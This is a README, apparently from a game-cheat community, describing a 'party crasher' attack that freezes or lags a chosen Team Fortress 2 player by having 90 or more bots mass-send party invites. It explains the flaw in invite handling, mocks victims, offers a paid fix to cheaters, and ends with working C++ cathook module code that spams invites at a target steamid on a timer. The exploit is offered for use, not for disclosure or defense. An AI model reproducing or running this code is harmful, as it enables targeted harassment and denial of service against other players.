# Party crasher

## What is this and what does it do?
Freezes/Lags someone's tf2 game by mass sending party invites.
The lag/freezes come from shitty code related to game coordinator.
When you send an invite to someone your client first checks to see if they are friends with you. If the target is not friends with you then your game client will not send the invite request. If you are friends with the target then your client will send the invite to gc and gc will send that invite to the target. Then there is another check on the target's end, The target's game client will see if you are friends or not with you. If you are friends with the target then the invite will popup on the target's game and they can accept or decline it. BUT because of shitty code from valve (ily valve <3) if you are not friends with the target then the TARGET'S GAME CLIENT WILL AUTOMATICALLY SEND A REJECT REQUEST TO GC AND IGNORE THE INVITE. When a client automatically ignores the invite from 90 or more bots then thats where the lag comes into play.

### Note: **Premiums work better and can lag even more (and freeze the game too)**
### Another Note: You need a ton of bots, **this wont work with 5 f2p bots**.

## Things you need
1. Party bypass enabled
2. Catbots, like a ton of them (90 or more f2p/premium bots)
3. The code to invitespam :joy:

## Cons and pros
Cons:
- You need a ton of bots to freeze a game (they can be f2p or premium but premiums work better)
Pro:
- Freezes/lags multiple targets (you will need more bots if you want to invitespam more people)
- Works with f2p bots and premium bots
- Legits cannot stop this.

## How to fix it

If you're a legit then there is a simple answer:
- You can't, shit out of luck, yes you are fucked!

If you're a cheater/bot hoster then there is some hope to stop the freezing and lag: 
- hit me up on telegram and slide me some cards then I'll give you a fix to stop your game from freezing or lagging.
- Or you can also just nicely ask however is lagging or freezing your game to stop. (good luck with that =D)

## How to freeze/lag someone's game
This is the fun part!

Put this code into your cathook fork or your cheat paste, then set steamid to whoever you want to freeze or lag and the invtime. (depending if you want to freeze or lag someone's game)

```
#include "common.hpp"

namespace hacks::invitespam
{

static settings::Boolean enabled("invitespam.enable", "false");
static settings::Int steamid("invitespam.target", "-1");
static settings::Int invtime{ "invitespam.invtime", "100" }; // Adjust this if you want to freeze or lag someone's game.

static Timer invtimer{};
static void Paint()
{
    if (!enabled)
        return;
    if (invtimer.test_and_set(*invtime))
    {
        g_IEngine->ClientCmd_Unrestricted(strfmt("tf_party_invite_user %i", *steamid).get());
        g_IEngine->ClientCmd_Unrestricted("tf_party_leave");
    }
}

static InitRoutine init([]() {
    EC::Register(EC::Paint, Paint, "paint_invitespam");
});

} // namespace hacks::invitespam
```


Thats all to it, Enjoy!
